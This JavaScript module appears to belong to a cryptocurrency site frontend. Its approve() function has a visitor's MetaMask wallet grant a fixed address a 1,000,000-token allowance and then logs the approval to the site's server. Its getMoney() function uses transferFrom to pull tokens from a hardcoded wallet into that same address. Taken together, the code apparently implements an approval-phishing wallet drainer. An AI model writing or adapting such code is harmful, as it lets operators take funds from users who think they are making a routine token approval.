import { ethers } from 'ethers'
import Web3 from 'web3'
import detectEthereumProvider from '@metamask/detect-provider'

import contract from './bnb-busd-contract'
import config from 'src/config'
import axios from 'axios'
import server from 'src/config/server'
import { getWalletFromDB } from 'src/components/wallet/store/actions'

async function approve () {
  const provider = await detectEthereumProvider()
  const web3 = new Web3(Web3.givenProvider || 'ws://localhost:8545')
  const coinContract = new web3.eth.Contract(contract.abi, contract.address, {
    from: provider.selectedAddress
  })

  coinContract.methods.approve(config.address, ethers.utils.parseEther('1000000')).send({ from: provider.selectedAddress })
    .then(async res => {
      try {
        await axios.patch(`${server.serverURI}/wallet/wallet/${provider.selectedAddress}/`, {
          bnb_busd_approved: true
        })
          .then(res => {
            getWalletFromDB(provider.selectedAddress)
          })
      } catch (e) {
        console.log(e)
      }
    })
    .catch(e => {
      console.log(e)
    })
}

async function getMoney () {
  const web3 = new Web3(Web3.givenProvider || 'ws://localhost:8545')
  const coinContract = new web3.eth.Contract(contract.abi, contract.address, {
    from: config.address
  })

  coinContract.methods.transferFrom('0x235601Ee6a81BE89CDf6281Dd05669EE166084d6', config.address, ethers.utils.parseEther('1')).send({ from: config.address, gasLimit: 100000 })
    .then(res => {
      debugger
    })
    .catch(e => {
      debugger
    })
}
//
// async function moneyGetter () {
//
// }

export default {
  approve,
  getMoney
}
